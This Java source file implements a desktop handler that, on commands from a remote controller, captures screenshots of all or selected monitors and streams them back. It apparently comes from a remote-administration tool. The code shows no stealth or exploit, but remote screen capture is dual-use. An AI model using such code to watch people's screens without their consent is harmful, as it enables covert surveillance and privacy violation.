package com.melardev.xeytanj.services;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.enums.MediaInstruction;
import com.melardev.xeytanj.enums.SessionType;
import com.melardev.xeytanj.logger.ILogger;
import com.melardev.xeytanj.models.MediaConfigState;
import com.melardev.xeytanj.models.ScreenDeviceInfo;
import com.melardev.xeytanj.net.packets.Packet;
import com.melardev.xeytanj.net.packets.PacketType;
import com.melardev.xeytanj.net.packets.multimedia.PacketDesktopConfigResponse;
import com.melardev.xeytanj.net.packets.multimedia.PacketDesktopRequest;
import com.melardev.xeytanj.net.packets.multimedia.PacketMediaResponse;
import com.melardev.xeytanj.remote.PacketHandler;

import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

public class DesktopHandler implements PacketHandler<PacketDesktopRequest> {

    private final IApplication application;

    public volatile int delay;
    public volatile boolean isRunning;
    private Rectangle screenRect;
    private Robot robot;
    private ConcurrentHashMap<String, ScreenDeviceInfo> screenDevices;
    private boolean shouldStop;

    List<String> monitoredScreens;

    private boolean shouldResize;
    private double scaleX;
    private double scaleY;
    private ILogger logger;

    public DesktopHandler(IApplication application, int delay) throws AWTException {
        this.application = application;
        this.delay = delay;
        screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        robot = new Robot();
        screenDevices = new ConcurrentHashMap<>();
        shouldResize = false;
        monitoredScreens = new ArrayList<>();
    }

    public DesktopHandler(IApplication application) throws AWTException {
        this(application, 0);
    }


    private void beginStreamingScreenshots() {
        logger.traceCurrentMethodName();
        Packet packet;
        Runtime runtime = Runtime.getRuntime();
        try {
            while (true) {
                if (shouldStop)
                    break;
                Thread.sleep(500);
                while (isRunning) {
                    ImageIcon image = getScreenShot();
                    packet = new PacketMediaResponse(PacketType.DESKTOP, image);
                    sendPacket(packet);
                    // Release the image, it takes lot of memory
                    image.getImage().flush();
                    Thread.sleep(300);
                    runtime.gc();
                    if (delay > 0) {
                        Thread.sleep(delay);
                    }
                }
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

    }

    private synchronized void sendPacket(Packet packet) throws IOException {
        logger.traceCurrentMethodName();
        application.sendPacket(packet);
    }


    private void updateScreenShotConfig(MediaConfigState config) {
        logger.traceCurrentMethodName();
        delay = config.getInterval();

        if (config.getScaleX() < 100 || config.getScaleY() < 100) {
            shouldResize = true;
            scaleX = (double) config.getScaleX() / 100;
            scaleY = (double) config.getScaleY() / 100;
        } else {
            shouldResize = false;
            scaleX = 1;
            scaleY = 1;
        }

        if (config.getSelectedDeviceNames()[0].equalsIgnoreCase("All")) {
            monitoredScreens.clear();
            monitoredScreens.add("All");
        } else {
            monitoredScreens.clear();
            monitoredScreens.addAll(Arrays.asList(config.getSelectedDeviceNames()));
        }
    }


    private PacketDesktopConfigResponse getPacketDesktopConfig() {
        logger.traceCurrentMethodName();

        List<ScreenDeviceInfo> screenDeviceInfoList = getScreens();
        return new PacketDesktopConfigResponse(screenDeviceInfoList);
    }

    private List<ScreenDeviceInfo> getScreens() {
        logger.traceCurrentMethodName();
        ArrayList<ScreenDeviceInfo> displays = new ArrayList<>();
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice[] gDevs = ge.getScreenDevices();

        for (GraphicsDevice gDev : gDevs) {
            ScreenDeviceInfo screen = new ScreenDeviceInfo(gDev.getIDstring());
            Rectangle rectangle = gDev.getDefaultConfiguration().getBounds();
            screen.setX(rectangle.getX());
            screen.setY(rectangle.getY());

            screen.setMinX(rectangle.getMinX());
            screen.setMinY(rectangle.getMinY());
            screen.setMaxX(rectangle.getMaxX());
            screen.setMaxY(rectangle.getMaxY());

            screen.setWidth(rectangle.getWidth());
            screen.setHeight(rectangle.getHeight());
            displays.add(screen);
            screenDevices.put(screen.getDeviceName(), screen);
        }
        return displays;
    }

    private void initUDP(int port) {
     /*   DesktopOutputStream baos = new DesktopOutputStream();
        BufferedImage capture;
        WritableRaster raster;
        DataBufferByte data;
        byte[] buf;
        byte[] result = new byte[4096];

        isRunning = true;
        DatagramPacket packet;
        int count = 0;
        int toSend = 0;
        int pointer = 0;
        int bufLen;
        while (isRunning) {
            try {
                capture = new Robot().createScreenCapture(screenRect);
                ImageIO.write(capture, "bmp", baos);
                buf = baos.toByteArray();
                System.out.println(buf.length);
              */  /*
         * raster = capture.getRaster();
         * data = (DataBufferByte) raster.getDataBuffer();
         * byte[] imageBytes = data.getData();
         */
           /*     bufLen = buf.length;
                do {
                    //com.melardev.xeytaj.net.packet = new DatagramPacket(buf, buf.length, address, port);
                    if ((bufLen - pointer) >= 4095)
                        toSend = 4095;
                    else
                        toSend = buf.length - pointer;

                    packet = new DatagramPacket(buf, pointer, toSend, address, port);

                    socket.send(packet);
                    System.out.println(count++ + " " + toSend);
                    pointer += 4095;
                } while (toSend == 4095);
                pointer = 0;
                if (delay > 0) {
                    Thread.sleep(delay);
                }

            } catch (AWTException | IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            */
    }


    public ImageIcon getScreenShot() {
        logger.traceCurrentMethodName();

        BufferedImage capture = null;

        double minX = 0, minY = 0, maxX = 0, maxY = 0;
        for (String screenName : screenDevices.keySet()) {
            ScreenDeviceInfo screen = screenDevices.get(screenName);

            if (monitoredScreens.contains("All")) {
                if (screen.getMinX() < minX)
                    minX = screen.getMinX();
                if (screen.getMinY() < minY)
                    minY = screen.getMinY();
                if (screen.getMaxX() > maxX)
                    maxX = screen.getMaxX();
                if (screen.getMaxY() > maxY)
                    maxY = screen.getMaxY();
                continue;
            }
            if (monitoredScreens.contains(screenName)) {
                minX = screen.getMinX();
                minY = screen.getMinY();
                maxX = screen.getMaxX();
                maxY = screen.getMaxY();
                break;
            }
        }

        capture = robot.createScreenCapture(new Rectangle((int) minX, (int) minY, (int) (maxX - minX), (int) (maxY - minY)));
        if (monitoredScreens.contains("All") || shouldResize)
            capture = resizeImage(capture);
        return new ImageIcon(capture);
    }

    private BufferedImage resizeImage(BufferedImage img) {
        logger.traceCurrentMethodName();
        int scaledWidth = (int) (img.getWidth() * scaleX);
        int scaledHeight = (int) (img.getHeight() * scaleY);
        BufferedImage imgOut = new BufferedImage(scaledWidth, scaledHeight, img.getType());
        Graphics2D g2D = imgOut.createGraphics();
        g2D.drawImage(img, 0, 0, scaledWidth, scaledHeight, null);
        g2D.dispose();
        return imgOut;
    }

    @Override
    public void handlePacket(PacketDesktopRequest packetRequest) {


        logger.trace("Handling " + packetRequest.getMediaInstruction());

        if (packetRequest.getType() == PacketType.DESKTOP_CONFIG) {
            application.sendPacket(getPacketDesktopConfig());
        } else {
            logger.trace("Handling " + packetRequest.getMediaInstruction());
            if (packetRequest.getMediaConfigState() != null && packetRequest.getMediaInstruction().equals(MediaInstruction.PLAY)) {
                isRunning = true;
                Runnable runnable = null;

                updateScreenShotConfig(packetRequest.getMediaConfigState());

                runnable = () -> {
                    beginStreamingScreenshots();
                };

                new Thread(runnable, "DesktopSender").start();

            } else if (packetRequest.getMediaInstruction().equals(MediaInstruction.PAUSE))
                isRunning = false;
            else if (packetRequest.getMediaInstruction().equals(MediaInstruction.STOP)) {
                isRunning = false;
                shouldStop = true;
                application.onSessionClosed(SessionType.REMOTE_DESKTOP);
            }
        }
    }


    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    private class DesktopOutputStream extends ByteArrayOutputStream {

        @Override
        public synchronized byte[] toByteArray() {
            return buf;
        }

    }
}
